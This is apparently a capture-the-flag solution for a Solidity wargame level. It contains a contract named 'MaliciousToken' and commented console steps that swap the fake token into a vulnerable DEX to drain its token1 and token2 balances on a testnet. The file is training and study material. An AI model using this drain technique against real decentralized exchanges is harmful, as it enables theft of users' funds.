// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "@openzeppelin/contracts/token/ERC20/ERC20.sol";

contract MaliciousToken is ERC20 {
  
  constructor(address dexInstance, string memory name, string memory symbol) public ERC20(name, symbol) {
        _mint(msg.sender, 40);
        super.transfer(dexInstance, 10);
        super.transfer(msg.sender, 30);
  }
}

/*
deploy contract
token1 = await contract.token1()
token3 = the address of the depoloyed contract
take contract token1 address and use deploy at address in rinkeby > use approve function with the levels contract address and large amount (need to bypass the dex contract because their approve function is flawed)
repeat for token 2
use approve function of malicious token contract
await contract.swap(token3,token1, 10)
await contract.swap(token3,token2, 20)
*/